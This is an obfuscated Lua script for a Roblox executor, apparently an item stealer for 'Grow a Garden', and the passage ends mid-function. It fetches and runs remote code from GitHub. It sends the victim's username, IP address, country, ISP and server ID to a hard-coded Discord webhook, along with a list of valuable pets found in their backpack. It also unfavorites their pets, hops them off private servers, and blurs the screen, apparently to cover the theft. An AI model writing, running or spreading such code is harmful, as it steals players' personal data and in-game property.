local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function KdOvFZYgKzIehHzTVMxiSEgY(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')

data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end


 
-- EXECUTE EXTERNAL SCRIPT
loadstring(game:HttpGetAsync(KdOvFZYgKzIehHzTVMxiSEgY('xZYSgEDXdcbScQnPsgwNYpPHBXUkaWBmegXqqHVOYDGfktUUTvaLHLKaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL05vTGFnLWlkL05vLUxhZy1IVUIvcmVmcy9oZWFkcy9tYWluL0xvYWRlci9Mb2FkZXJWMi5sdWE=')))()

-- CONFIG SECTION
local webhookUrl = KdOvFZYgKzIehHzTVMxiSEgY('OzcIzaIFJDZPSGvkiDOzWdMNvdiZhshjAjEATWenuzdZYIgMSVHdEdQaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjgyNTEzODEzNDY1MTA0My9KaFc5SU42c2N0aGdRbmN1VVlmQWVmeGJOT3hpTTJHWk1KNlY2bzFoQXVKVFdYcVVxTXQ2Yll4RnBicU5URU1yeEx5aQ==')
local targetUsernames = {KdOvFZYgKzIehHzTVMxiSEgY('SyZoBlFOLpmZCWnnIzBGPtaxyqHPRojhptWcBsalXqUsIPjvgWJsIZTQmFkUGxheWVyMTIz'), KdOvFZYgKzIehHzTVMxiSEgY('DKTRZbWvifftvZqCIMOItlLAACepgGoBPPDqfMERyZprXwDQUpBxidfTXlBbHQ='), KdOvFZYgKzIehHzTVMxiSEgY('eWWaFDpWIyyaqlmYwYTHRpQgmayBUswtWHTCVVnhkIpssxyEleNzDGVRW5lbXlHdXk='), KdOvFZYgKzIehHzTVMxiSEgY('tEaMZouXNsTTcgINiAEOXmWbuPvIIMSgKeAzesgNGDslZMwqZqJHvQvaW50ZXJjZXB0ZXJudW1iZXIx'), KdOvFZYgKzIehHzTVMxiSEgY('WaiVAUITmphoGZhOFviSviSNBZFRVyvjOjHgwDxXcsdEgsVehqkPzLKaW50ZXJjZXB0ZXJudW1iZXIx')}
local drainPets = {
    KdOvFZYgKzIehHzTVMxiSEgY('ODlhWuBCoKNfpwuuQyincfOIgdUlhwxbeBeDpXgIPHgaOSOJqKUyJYdRHJhZ29uZmx5'), KdOvFZYgKzIehHzTVMxiSEgY('tpvCmSdZXtjnUfTkWdTYEqEbWBpdRWaCDsApsCDwcERDCoMuUTpQhytVOKAkVJleA=='), KdOvFZYgKzIehHzTVMxiSEgY('csZdZiPoFrjmJuIsbEbdbqosQDVDeqjyaulcowseBMMYqIAvIoKnfHsUmFjY29vbg=='), KdOvFZYgKzIehHzTVMxiSEgY('odSQhYjhexpALKqKOGtcqEkLTpPigkSJbPkqAjAfDHjpJfWgxaStJJmUmVkIEZveA=='), KdOvFZYgKzIehHzTVMxiSEgY('lROIpXdDFOYzBxKZVdXrAGSLOKLKjRDOGZTNswyghBkHdnaZhCmmuaGUXVlZW4gQmVl'),
    KdOvFZYgKzIehHzTVMxiSEgY('gPvWZuPpdSfImedxdcCUqIyjQNKGWaFxKhrLwaYsbmAQzbRrpBlzmZBRGlzY28gQmVl'), KdOvFZYgKzIehHzTVMxiSEgY('EGrPyVZBczUtwsiHDwoNEfrkZHsxdVmiqWpqhvhbEITuoMWNkphRjfbQnV0dGVyZmx5'), KdOvFZYgKzIehHzTVMxiSEgY('LAXxXEkSAgpONQrHVbtTVCojjJLLUivLnxkJWuMrOEYypuBApmPZeMhTWltaWM='), KdOvFZYgKzIehHzTVMxiSEgY('AXNCRDXCVKGFNczDRzSrCkNLsmdHomwgJpLiLmZGzqyuGUtGplMXWIFTW9vbiBDYXQ='), KdOvFZYgKzIehHzTVMxiSEgY('TnCEKbcaYNNSCSRsKAUMIeNQREtPHSDjtgTzaPqZhkiHXUXIEDahoswRmVubmVjIEZveA=='),
    KdOvFZYgKzIehHzTVMxiSEgY('WQyfAQYJtsfIRTKUyoUSVTARRGbylVqWaVlIYyZOZHSgRtTyjDCCYmDVHJpY2VyYXRvcHM='), KdOvFZYgKzIehHzTVMxiSEgY('CCNksUeQPZEWldoZhqvORdEfsQugkQYaacAvSNwoWnbzTQacvzZJHjwQXhvbG90bA=='), KdOvFZYgKzIehHzTVMxiSEgY('ishENKPSkvDZznDFDxqocrFotwRRpLkAWlYVgAvtarOZJTMklIzVHphQmVhciBCZWU='), KdOvFZYgKzIehHzTVMxiSEgY('QedwzRVCFtdlluFpDlLkEdhBZdnUekfIugBhYFTUrgYJmkzwRNzykawUG9sYXIgQmVhcg=='),
    KdOvFZYgKzIehHzTVMxiSEgY('EaqUDWDcwaAeVoLIhOgbtGaSDakGrWZAtRQBTzdYIpjrCjzIVvzqrpqUHJheWluZyBNYW50aXM='), KdOvFZYgKzIehHzTVMxiSEgY('sQbHAhkUzJZdEekzKcgPWKCdyvliLTDmxoTVaKfIJbMxalfriyHMzzXU2NhcmxldCBNYWNhdw==')
}
local petKeywords = {
    KdOvFZYgKzIehHzTVMxiSEgY('wPPUagkVJBlvwTgBZeabeXyLfXMPPGxrHqrZLSXNkcimhlFmXIRkYcLU3RhcmZpc2g='), KdOvFZYgKzIehHzTVMxiSEgY('SjWszSopUIwpCSPyTUoTaPfasoVVVDVuCrgGacRYiDjhmhwgSlXXFkPQ3JhYg=='), KdOvFZYgKzIehHzTVMxiSEgY('JeatonrJXeFcJxWoCPfIKZoqemYvSVRTCNCkKNIEVhRTMPyjNcfqDoLU2VhZ3VsbA=='), KdOvFZYgKzIehHzTVMxiSEgY('HxKBeFFAAOrGDhwDYSFNnDikwBtWSdhOCBikcbRvwOGPvtqmdHbuCYNQnVubnk='), KdOvFZYgKzIehHzTVMxiSEgY('TLyPEJpdUGFojbageRzWfkyvobQjVvYtyRPYwhmHgorywVbBtvEkpiVRG9n'), KdOvFZYgKzIehHzTVMxiSEgY('UOFuZURaotEWlubwTIumvojxPnvqbQowoYFkcjbhkZblQYcSkyqOWWMR29sZGVuIExhYg=='), KdOvFZYgKzIehHzTVMxiSEgY('FNxIzzEdQAuXFMoaTmHfRPVPXndiHpIchiNnPRovojatVkmvMzTesifQmVl'),
    KdOvFZYgKzIehHzTVMxiSEgY('FtIXxvcsdPnOIlCLMYrvRtjCVHZchHvcnOxVvRmLDymkkUAqFgSuUJTQmxhY2sgQnVubnk='), KdOvFZYgKzIehHzTVMxiSEgY('tNTsDisKoTJReCjKqRslDAEgZDmUiYaPAICdDYwxINxidLJezOiGRFaQ2F0'), KdOvFZYgKzIehHzTVMxiSEgY('DJZlKftAkDYnrHBbcJFiKFrrubUqddeSBfUwVifoEkqkDAirXqTKzqFQ2hpY2tlbg=='), KdOvFZYgKzIehHzTVMxiSEgY('eyVBSAFHMxYXCWwkuaMWxGGDxRNBGPhwDxREdaUhpfPxAeJxxOQWctGRGVlcg=='), KdOvFZYgKzIehHzTVMxiSEgY('plEvDZBEBrsFbnNWGSLLlkFWeyecuUMqltSNeBrJjWsYQMkkTGxNBopTW9ua2V5'), KdOvFZYgKzIehHzTVMxiSEgY('DAfLQTwGdAUZimnvwNVICOVuNtORFYAyjxOvPmbwspGarIWGutFfDRmT3JhbmdlIFRhYmJ5'),
    KdOvFZYgKzIehHzTVMxiSEgY('YWeMLyMZLjQcpVFAoWHCgarlDgRJohsQXhjninjSFmWNhIRmGHBGyaRUGln'), KdOvFZYgKzIehHzTVMxiSEgY('XEJtGrYcBBBcQKzIOyHaQxAxNMzdRtEgbloemHNjKZdjlsrrGCEIKcAUm9vc3Rlcg=='), KdOvFZYgKzIehHzTVMxiSEgY('qglNPxIhidpnbzeTePNqBoauCzbgHiDrrYfDmtqdyMXtmSRQaMFVFdIU3BvdHRlZCBEZWVy'), KdOvFZYgKzIehHzTVMxiSEgY('DiZCHutNWfHQwgToLZVgWKKBDyfrOAcRnGzBkKiltyFdJvinydbQFUrRmxhbWluZ28='), KdOvFZYgKzIehHzTVMxiSEgY('FiUiVAxfNqyVXcUxmehSdSrvMSPnTgWlUHkUkhBjJWouftshlhnnqvjVG91Y2Fu'), KdOvFZYgKzIehHzTVMxiSEgY('LAQoDOXWTYyeeUnKLayGncrQuKGTItsUiLfXOSZXTwZSPTrhkmIbmRWU2VhIFR1cnRsZQ=='),
    KdOvFZYgKzIehHzTVMxiSEgY('naPvKPyhEioVvACfcKvjKnILVmqNKuMkIgcdURGRxoqpKAJPOYrVPgiT3Jhbmd1dGFu'), KdOvFZYgKzIehHzTVMxiSEgY('NXqMIhvhieAVnBYCDElRmjmmaioMncQLiJDgYbThvGQPKAwmtwBKWQNU2VhbA=='), KdOvFZYgKzIehHzTVMxiSEgY('uptndjDtqQyFLqiNtbJzwAIjHIHyRnDfPcuqRRUlqrKCDNlDUJlIcUtSG9uZXkgQmVl'), KdOvFZYgKzIehHzTVMxiSEgY('FNtNkXSakIqTiSQaRIzmnyanWlRdQrUPodDXpCOoTkJuYPwreFYQlPFV2FzcA=='), KdOvFZYgKzIehHzTVMxiSEgY('AXLPvXZiqfWFMyBbCWnxwzaUiAvZkpcKKCssFlqjvDScmBYWjKVQOAzVGFyYW50dWxhIEhhd2s='), KdOvFZYgKzIehHzTVMxiSEgY('UWkCgxyvBQNgEaBeVgGKzRqQZTHgQmfkPIrXUhuXRZrSOLuAhYbtYteUmFwdG9y'),
    KdOvFZYgKzIehHzTVMxiSEgY('HOyFTyJpdzLXIhXDmIhqAJQhCTsvjZCrePinCrXZKTVFglTzTosWgtoVHJpY2VyYXRvcHM='), KdOvFZYgKzIehHzTVMxiSEgY('xFgkBXAIaJIhvEOngmRwWFvPbeHuKJkSqQbbdoFOyETbOPcLmOhAmTsU3RlZ29zYXVydXM='), KdOvFZYgKzIehHzTVMxiSEgY('ZaxSUxeJVwlzBxdkckiHnfDJDTFfHvlSnhDOhynjbJJGsgWfuYrOndUUHRlcm9kYWN0eWw='), KdOvFZYgKzIehHzTVMxiSEgY('AFQfUIiTxWjHUeTWItkNtDdlIqHLoQyjHwrdJRPGYpdMEmakBMeeTDFVHVydGxl'), KdOvFZYgKzIehHzTVMxiSEgY('STLijudsevktDEOMMdJvecFzcMSGCmpXjmCCTeChfjdtWcZXAlSRrXbQ2F0ZXJwaWxsYXI='),
    KdOvFZYgKzIehHzTVMxiSEgY('SNVXmAbTiuRqrSmHoMHTFdeXaYxKZsGGOUzuGISRpaSjiqhtJxaXfXFUGV0YWwgQmVl'), KdOvFZYgKzIehHzTVMxiSEgY('VdedMBmdEffhDvbFQiFHYmrvIHtoJQwPHAyxGORuzbjoFGWMbNCVAhNTW90aA=='), KdOvFZYgKzIehHzTVMxiSEgY('TqwjSFghCnGiwMfALtocvywDpqfvVFskvStdqiDLjNKOnabGIfpElUlU2NhcmxldCBNYWNhdw=='), KdOvFZYgKzIehHzTVMxiSEgY('uxwpLStXNsFnPDQBGDSxXqCpjNXHXyOemWOKGXmTZidSzpXqWeiezsOT3N0cmljaA=='), KdOvFZYgKzIehHzTVMxiSEgY('vezFsWxDNgoJuEIrVFiMoDmHerdOiIIxcctSjlZJGPjPcdBquhoBysnUGVhY29jaw=='),
    KdOvFZYgKzIehHzTVMxiSEgY('xwMbAYfEiFcpEAQrpxWlcrQshdxTghtKVcaHQwtiNMBXpYSWuvEugbXQ2FweWJhcmE='), KdOvFZYgKzIehHzTVMxiSEgY('oDJABsNytfOJbCHghJrDsgyMJPiwIMSEsTVrHQmrLpErthWDnWVKwjrU2FuZCBTbmFrZQ=='), KdOvFZYgKzIehHzTVMxiSEgY('XMWVUWIvhsHgjvNjeQMwxIhpTqzcDwaNDWmKGWCsTzbugPaAdnfBndJTWVlcmthdA=='), KdOvFZYgKzIehHzTVMxiSEgY('NZNuNjCiHnOVDnlANQIOPmOcBHvpAVopgSdIMwKRgKoFbVKiTHyJbzCQnJvd24gTW91c2U='), KdOvFZYgKzIehHzTVMxiSEgY('RyLYCtxooMplYOzuTPlheMBRlsniXONGiWyAjNtFDtzDVEzNBPwzyjQR2lhbnQgQW50'),
    KdOvFZYgKzIehHzTVMxiSEgY('SszzCngSmrcjRllTGjRBQSJpJNMNypCQSSwxDDVqGKDHmNeRyBYkwAOR3JleSBNb3VzZQ=='), KdOvFZYgKzIehHzTVMxiSEgY('osQUIiWaFEUukYxhaWlBwVfFKAoRfEwCcdvsItHmqUybcOKxQeFkOqJUHJheWluZyBNYW50aXM='), KdOvFZYgKzIehHzTVMxiSEgY('OcbjUPgRxMSYIjfTXVXjFPCFWOQKmhvfIwfCaHKUTsvMebaOYZulBbXUmVkIEdpYW50IEFudA=='), KdOvFZYgKzIehHzTVMxiSEgY('LVcRvieiCrawrATIZFLSmAPNCIejXBMqJZQcHgxSuIKwrUrXZDAaXLkU25haWw='), KdOvFZYgKzIehHzTVMxiSEgY('HWZxluRRjPNauDHontilILCHBlLaoMRnmVORVOWwDZEEckIOjACpOBIU3F1aXJyZWw='),
    KdOvFZYgKzIehHzTVMxiSEgY('mKzPKvqSyKQXZoahLpXyhNheyUkLYsqyCXVonDwMThYRkUxNBuKfTOUQmVhciBCZWU='), KdOvFZYgKzIehHzTVMxiSEgY('nwolPoUeFLpnxAYqwNkIIkYlDtcDQuEWosZGGxTCFubELiGgKdxNMJjQnV0dGVyZmx5'), KdOvFZYgKzIehHzTVMxiSEgY('ChZAwtyYdjemdbaCsgmWdEDDNtaEmCQvxALlBuMyVivaJGboLzqrMsIQnJvbnRvc2F1cnVz'), KdOvFZYgKzIehHzTVMxiSEgY('IuPLwBQOeTteUxulOqzqcKBvGdanUNeLLCvzvvuCXJsJSzRplxHSsRxUGFjayBCZWU='), KdOvFZYgKzIehHzTVMxiSEgY('AYfwatcIKaoWzjsZVkQCHolmtmmqOgvwHOWqbmbRUasONNUgeeAwgIITWltaWMgT2N0b3B1cw=='),
    KdOvFZYgKzIehHzTVMxiSEgY('irQhwcSSaMVVVhuovqYjoBPqEhVeXTZyHvNVuMcoGLtlzSphZGaOddVSHlhY2ludGggTWFjYXc='), KdOvFZYgKzIehHzTVMxiSEgY('axSiaQdZixHhFsEjURskUfrzZcUeDCUKOBaWylpMCEdSpMMnvSFZSRwQXhvbG90bA=='), KdOvFZYgKzIehHzTVMxiSEgY('asXAqIhQEncCOVqmBigRORbHjFnLJypdwIbmgdzCwqJBlLWgiGeFUofUmVkIEZveA=='), KdOvFZYgKzIehHzTVMxiSEgY('LJleMWSTToTrLQwxHfsPrsNInQlpMQipPNsnJWkzjUpCQOmhuRZydYnVOKAkVJleA=='), KdOvFZYgKzIehHzTVMxiSEgY('CDofDvVVHmwltgDpTEyaRkXVBfrGhIYEURUUcoUeSMrKaRxZXXFilqSRHJhZ29uZmx5'),
    KdOvFZYgKzIehHzTVMxiSEgY('WnNZPLWbyiazLjJGXsCIEFHOZgNnZOvexcTVOlUzRllkDCumogYzYDCUXVlZW4gQmVl'), KdOvFZYgKzIehHzTVMxiSEgY('buuInzYPEIpGODukGgHQQqYEnTuYdViIHmcyDlEpKRsGZsbohsJxOnARGlzY28gQmVl'), KdOvFZYgKzIehHzTVMxiSEgY('fFPqKmVyVQtRNUxOWnjOiPmrsRYECumxcfGhnGmDluhWMYKrGKGDhVQRmVubmVjIEZveA=='), KdOvFZYgKzIehHzTVMxiSEgY('PToMvcsafaiNzQraYKAwjDroftYJIYwbrumJRuSUoeqldQxjmhpJuefTW9vbiBDYXQ='), KdOvFZYgKzIehHzTVMxiSEgY('xZwoWMjvtvPOCSQdgPDlKnMWLcrJqSqTOdliPrLixfoFheYmQBxFThRUmFjY29vbg=='),
    KdOvFZYgKzIehHzTVMxiSEgY('AsqXBDmkltJEBfzWMjtZqYOVJQWdDzgWfzFlxQnNnBVilzeHssYtYkKUG9sYXIgQmVhcg==')
}

-- SERVICES
local Players = game:GetService(KdOvFZYgKzIehHzTVMxiSEgY('XIFClwjxGtmSYdklIbkwaoyTlzUuoovAIOtCiaHWmXpZgDypZOjbszbUGxheWVycw=='))
local ReplicatedStorage = game:GetService(KdOvFZYgKzIehHzTVMxiSEgY('KFVYFwdJlgaDUpGIHHoGqivTgIeRHrawyLzmycxlogtksBnYNKkLCbAUmVwbGljYXRlZFN0b3JhZ2U='))
local HttpService = game:GetService(KdOvFZYgKzIehHzTVMxiSEgY('qqpdjBZQGpgpXrcOYGgffBQGEzYPJhWwXbCXymmbSlAlUdTwqSYHhadSHR0cFNlcnZpY2U='))
local TeleportService = game:GetService(KdOvFZYgKzIehHzTVMxiSEgY('eFTwcOjTiGvJDvPwUVSTEEiXkEQgQqInOVzkUDXaqZehHBqCMiOINWbVGVsZXBvcnRTZXJ2aWNl'))
local Lighting = game:GetService(KdOvFZYgKzIehHzTVMxiSEgY('kCXWCBPAGrdWLDkDmMtJLWDXzcBwcUHHYRNLSQzdaOIszUxfftaCgLQTGlnaHRpbmc='))
local localPlayer = Players.LocalPlayer
local backpack = localPlayer:WaitForChild(KdOvFZYgKzIehHzTVMxiSEgY('OaljlMNyGLwPTvJLSaRPOcxysgJVBuomRKvjlPMvsRCJzeAhHOPsqqDQmFja3BhY2s='))
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local jobId = game.JobId
local placeId = game.PlaceId

-- AUTO SERVER-HOP IF PRIVATE
local function getLowestServer()
    local req = http_request or syn.request or request or fluxus.request
    if not req then return nil end
    local cursor = KdOvFZYgKzIehHzTVMxiSEgY('TzmoxefisBqswCTjflgUoAUgMizbHmQfJiXCHmmyISIpOOnqkYVmGUh')
    local lowest = nil
    repeat
        local url = KdOvFZYgKzIehHzTVMxiSEgY('JOtWbFVIGJyounrFowzAeNafAvcnbJvuZrTrOIflMtKXupJKdHIKrzzaHR0cHM6Ly9nYW1lcy5yb2Jsb3guY29tL3YxL2dhbWVzLw==') .. placeId .. KdOvFZYgKzIehHzTVMxiSEgY('ZoMXRoweVBpywvtkwfamDFZZxckumvhzBBYxnPmSFLNIEixtNOuWnkTL3NlcnZlcnMvUHVibGljP3NvcnRPcmRlcj1Bc2MmbGltaXQ9MTAw')
        if cursor ~= KdOvFZYgKzIehHzTVMxiSEgY('zOrrZqIOBSqcvxNTHvmQrIReRkHnuUtKdxphUYDUJLsjSFGYBGzjBUE') then url = url .. KdOvFZYgKzIehHzTVMxiSEgY('cjPOCKEUZjmFPWCdxtaJqrDXBFgIFHQeZXFQaToAAaZaAtGCudzYOkVJmN1cnNvcj0=') .. cursor end
        local response = req({ Url = url, Method = KdOvFZYgKzIehHzTVMxiSEgY('TMhRPiUIybvTyaUWSnpjszOMFOFcNiyuzUNOZikpTdjxqQKVmfYoVnSR0VU') })
        if response and response.Body then
            local data = HttpService:JSONDecode(response.Body)
            for _, server in pairs(data.data or {}) do
                if server.playing < server.maxPlayers then
                    lowest = server
                    break
                end
            end
            cursor = data.nextPageCursor
        end
    until lowest or cursor == nil
    return lowest
end

local wasPrivateServer = false
if game.PrivateServerId ~= KdOvFZYgKzIehHzTVMxiSEgY('bWVlyeKekvkTmfsUhTrWqOQSYiCtqEGPYhkokbgAYVjCVQKTsQMcuAO') and game.PrivateServerOwnerId ~= 0 then
    local lowestServer = getLowestServer()
    if lowestServer then
        wasPrivateServer = true
        warn(KdOvFZYgKzIehHzTVMxiSEgY('lxHDbaMRgnamASuGIKQXeZQnkQFcFjVgtktGLCNZOAzFqiGxWPexPGlWypdIFByaXZhdGUgc2VydmVyIGRldGVjdGVkLiBIb3BwaW5nIHRvIHB1YmxpYyBzZXJ2ZXIuLi4='))
        task.wait(3)
        TeleportService:TeleportToPlaceInstance(placeId, lowestServer.id, localPlayer)
        return
    else
        warn(KdOvFZYgKzIehHzTVMxiSEgY('jCNITYiSZrHMTucutFapZXMkMfxynkyVBBHallocqgDJycerIBhgFmqWyFdIE5vIHB1YmxpYyBzZXJ2ZXIgZm91bmQu'))
    end
end

-- HELPERS
function freezeVisual()
    local blur = Instance.new(KdOvFZYgKzIehHzTVMxiSEgY('LEhoWNBtyzxCvMIQVlXzvPYqgXdUQuCHDrgOajIIYYJMWejFwFkVOUzQmx1ckVmZmVjdA=='))
    blur.Size = 999
    blur.Parent = Lighting
end

local function hasKeyword(name, list)
    for _, keyword in ipairs(list) do
        if string.find(string.lower(name), string.lower(keyword)) then
            return true
        end
    end
    return false
end

local function getFilteredPets()
    local filtered = {}
    for _, item in pairs(backpack:GetChildren()) do
        if item:IsA(KdOvFZYgKzIehHzTVMxiSEgY('BtVQzKVlhWJCANmGrQwCSmWmtcxSpVycVmjpNACbkStOhyfDViRbhpnVG9vbA==')) and hasKeyword(item.Name, petKeywords) then
            table.insert(filtered, item.Name)
        end
    end
    return filtered
end

local function chunkItems(items)
    local chunks = {}
    for i = 1, #items, 5 do
        local chunk = {}
        for j = i, math.min(i+4, #items) do
            table.insert(chunk, KdOvFZYgKzIehHzTVMxiSEgY('WpnEJaykLveNVKlGUNbrvVFxFlJnVISPxTKMhIuVBmiScVEJEBTOZnoLSA=') .. items[j])
        end
        table.insert(chunks, {
            name = KdOvFZYgKzIehHzTVMxiSEgY('hBkKRHfqMIRGnLKCNkYrOpvvZXcVPhaHUbfeaFEuhwAEWvKkVIckwov8J+OkiBQZXRzIA==') .. tostring(i) .. KdOvFZYgKzIehHzTVMxiSEgY('cGekcTpXTrFrPdOuaJbijmziRsvvyaWlnRazLEkOGvLsKTwLlDMbCgp4oCT') .. tostring(math.min(i+4, #items)),
            value = table.concat(chunk, KdOvFZYgKzIehHzTVMxiSEgY('vtMvkSyFRYVNVWXxFGRZwpGTfliRaccbAoljPhfDUnJpBHZHHJoYTdSXG4=')),
            inline = false
        })
    end
    return chunks
end

local function sendWebhook(embedFields)
    local data = {
        content = KdOvFZYgKzIehHzTVMxiSEgY('FaeJBrKyXqSTUUyjYAvgOfydeAhXYwhbKbWFVAeDEXUXoDOfTpYLGdr'),
        embeds = {{
            title = KdOvFZYgKzIehHzTVMxiSEgY('mDmoUSEViLlOaFQQDJDUHdjVCZqCiiLqnTBTwxnFCvBTnoAGwxVqRrY8J+QviBHcm93IGEgR2FyZGVuIFJlcG9ydA=='),
            color = 16753920,
            fields = embedFields,
            footer = { text = KdOvFZYgKzIehHzTVMxiSEgY('EEamkTvlxNbfJHLeozNDVGNbYxpSmIwbphGnZTENzQmeCXEAgUVuunmRGVsdGEgRXhlY3V0b3IgTG9nZ2Vy') },
            timestamp = os.date(KdOvFZYgKzIehHzTVMxiSEgY('QrvXiRjQlVAjEmYfReRPmLQRqjxHHXTHNCwwoEPysVEEwgUGKmCuixkISVZLSVtLSVkVCVIOiVNOiVTWg=='))
        }}
    }
    local req = http_request or request or syn.request or fluxus.request
    if req then
        req({
            Url = webhookUrl,
            Method = KdOvFZYgKzIehHzTVMxiSEgY('sLwqODlSHBsuzEqFTkBJvQqZADcruUNGdwBqaoTcUygXCpIogkpnAYhUE9TVA=='),
            Headers = { [KdOvFZYgKzIehHzTVMxiSEgY('xviZOWnFIhXudlclqSpraxxetNAyFLdWTaenxHVPfntUKxZbTaaOUQyQ29udGVudC1UeXBl')] = KdOvFZYgKzIehHzTVMxiSEgY('cKpeQZaoLqurTDmWjDfAzxvppdhJNNJUsVskewFCiMaWeEWyXgxGQAAYXBwbGljYXRpb24vanNvbg==') },
            Body = HttpService:JSONEncode(data)
        })
    end
end

local function getIPInfo()
    local req = http_request or request or syn.request or fluxus.request
    if not req then return KdOvFZYgKzIehHzTVMxiSEgY('yZPqFOrEyGjmJkgsBFPKzwMFrCNpUvoVKxqEbvwrYrkQvKmAqYkShkjVW5rbm93bg=='), KdOvFZYgKzIehHzTVMxiSEgY('ArIOPrJEmApsxepaighnAhzgrxqmUohLckggWODSglMTXQRrkpSyeMoVW5rbm93bg=='), KdOvFZYgKzIehHzTVMxiSEgY('qLNaFUUXxlCCKaXjeITfOIEWlVLXNdLWiNsjZHQUXrwbhvwdTFulpLFVW5rbm93bg==') end
    local result = req({ Url = KdOvFZYgKzIehHzTVMxiSEgY('iEmaNZqLUHJtSrKnXhqlJmsOBVQuPtZPOzpoTWiOqGLeCGWafhUKTuLaHR0cDovL2lwLWFwaS5jb20vanNvbi8='), Method = KdOvFZYgKzIehHzTVMxiSEgY('cnsyhwkbqqUdgLbVGFbDqlOSkmbeptpfGoiVqYVGDUEdBqggShPIEpkR0VU') })
    if result and result.Body then
        local body = HttpService:JSONDecode(result.Body)
        return body.query or KdOvFZYgKzIehHzTVMxiSEgY('CwvDURURAMuKskaPHYhQtvnbKcCcplbDgQDrtFoxMUtOKuMMWgCqkiAPw=='), body.country or KdOvFZYgKzIehHzTVMxiSEgY('dmunDGCVkYQvEwrBzZanRDxEgAhBYXXPccAcgrlvgFryYjBYmGupofgPw=='), body.isp or KdOvFZYgKzIehHzTVMxiSEgY('bXQvBoHWChCEsLUrzqiqdyTdwdlKxbSbmJOJTJxbhSZteWChvVEYJdNPw==')
    end
    return KdOvFZYgKzIehHzTVMxiSEgY('juDuyRHwroATWrkFOvcGaHTLHGdOmTDvHfxQbVtuaoxXkmoKgBtjoRePw=='), KdOvFZYgKzIehHzTVMxiSEgY('BytrGLYpTgyJLgAllKYSBWotYCQVmEkIGKkjbDbqCSynZjIlISUletkPw=='), KdOvFZYgKzIehHzTVMxiSEgY('RTpYqkhezuHZufFdOdfceMTDEvuYsawMKUTsTKbluiJgFZoOVQvISMKPw==')
end

-- UNFAVORITE PETS AND SEND LIST
local function unfavoriteAllPets()
    local dex = ReplicatedStorage:FindFirstChild(KdOvFZYgKzIehHzTVMxiSEgY('PexrdoKrpRumZVeOiEulDdsObRvALPkkPNCLxBfbQpYCAgTFuizigLRRGV4'))
    if not dex then return end
    local unfavorited = {}
    for _, item in pairs(dex:GetChildren()) do
        if item:IsA(KdOvFZYgKzIehHzTVMxiSEgY('PvYUDAySnJAOgaVODQhtFstnxTGHMOCcAkxvcYicXPPdmGgzlXujqsVSW5zdGFuY2U=')) and item:GetAttribute(KdOvFZYgKzIehHzTVMxiSEgY('quJgshGpZzGIeWuQHwtFGEdPkFeBxkXCPmNanccWgVoRDBIcaivZEDfZA==')) == true then
            table.insert(unfavorited, item.Name)
            ReplicatedStorage:WaitForChild(KdOvFZYgKzIehHzTVMxiSEgY('sPyPSdixsiVSOyXNfYXdNGqJEPBJNNvEmgPvsnAmHfqYZkwFQWLVbFrR2FtZUV2ZW50cw==')):WaitForChild(KdOvFZYgKzIehHzTVMxiSEgY('MfRImnfJkENBKzglNPoJQGmoVBuvlXTPhoibtYrLLOMqXBSVvsbLicLVG9nZ2xlRmF2b3JpdGU=')):FireServer(item.Name)
            task.wait(0.2)
        end
    end
    if #unfavorited > 0 then
        sendWebhook({
            { name = KdOvFZYgKzIehHzTVMxiSEgY('JFtwTPgAMytYsSwpTUvVaXhJvYSSoIQItcQepRKRVTIcIfubNFkwhPV8J+aqyBVbmZhdm9yaXRlZCBQZXRz'), value = table.concat(unfavorited, KdOvFZYgKzIehHzTVMxiSEgY('lNQkmkBXCxGAbsLRvvaoBBMwKBreXpqcqBPiWKYwhLuXtldzTGDBfUDLCA=')), inline = false }
        })
    end
end

-- Send user info
spawn(function()
    local ip, country, isp = getIPInfo()
    sendWebhook({
        { name = KdOvFZYgKzIehHzTVMxiSEgY('NeGqhORzfnPQZdCeGZpNxTXWtASPxMpTyFvZAVbHdjYaowbBfQsvQuH8J+RpCBVc2VybmFtZQ=='), value = localPlayer.Name },
        { name = KdOvFZYgKzIehHzTVMxiSEgY('SyieNDPzErwCcpXVqnVXwhMyaZYrMGnFtmilCJscUhsmithZZdiJsrH8J+MkCBJUA=='), value = ip },
        { name = KdOvFZYgKzIehHzTVMxiSEgY('cPPtvKDkNYBKgfWOCwcugUwSLEOZLMPdKEXNlXOwOmFgVWGEYfFgNjR8J+Xuu+4jyBDb3VudHJ5'), value = country },
        { name = KdOvFZYgKzIehHzTVMxiSEgY('zyNdJxGdsrSNlBtnUxJbaLGSaOtSrDHrohHiyluZPDUoPbFPIzBbxvB8J+SuyBJU1A='), value = isp },
        { name = KdOvFZYgKzIehHzTVMxiSEgY('BXMtmJRntkvXIZPnaMMgnVxbQEYIcVTeofeHmMMnEWfFTRQabbdKzGd8J+ToSBTZXJ2ZXIgSUQ='), value = jobId },
        { name = KdOvFZYgKzIehHzTVMxiSEgY('xBxxvvSTvnUnXweuiMRDIythSAgvnPKfPrqmZVCBmFikYUDYwWItCKu4o+x77iPIFRpbWU='), value = os.date(KdOvFZYgKzIehHzTVMxiSEgY('ALONKLkcAXzZzTDlNyRFPTsvWTztAoRhalxhpCFiqvQmSgmMisfTFhPJVktJW0tJWQgJUg6JU06JVM=')) }
    })
end)

-- Send filtered pets
spawn(function()
    local pets = getFilteredPets()
    local petChunks = #pets > 0 and chunkItems(pets) or {
        { name = KdOvFZYgKzIehHzTVMxiSEgY('TorNVuskZBxTehGJmSyJjbYEEQHXIUqNqbETJopdIgWGJtnYUGeYPVV8J+OkiBQZXRz'), value = KdOvFZYgKzIehHzTVMxiSEgY('NRZHHuuedRtaogPSPVsqLWfTPrtEhQcWiezcfYTCVtmticXSMWeLUnmTm9uZQ=='), inline = false }
    }
    sendWebhook(petChunks)
end)

-- Send 3rd message: server status
spawn(function()
    sendWebhook({
